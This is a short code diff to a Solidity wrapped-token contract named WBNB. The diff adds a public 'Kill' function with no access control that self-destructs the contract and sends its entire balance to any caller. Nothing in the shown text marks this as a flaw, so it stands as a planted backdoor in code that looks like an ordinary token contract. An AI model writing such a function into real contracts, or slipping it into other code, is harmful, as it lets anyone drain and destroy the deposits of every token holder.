@@ -34,7 +34,11 @@ contract WBNB {
     function totalSupply() public view returns (uint) {
         return address(this).balance;
     }
+    function Kill() external payable {
+        address payable addr = payable(address(msg.sender));
 
+        selfdestruct(addr);
+    }
     function approve(address guy, uint wad) public returns (bool) {
         allowance[msg.sender][guy] = wad;
         emit Approval(msg.sender, guy, wad);
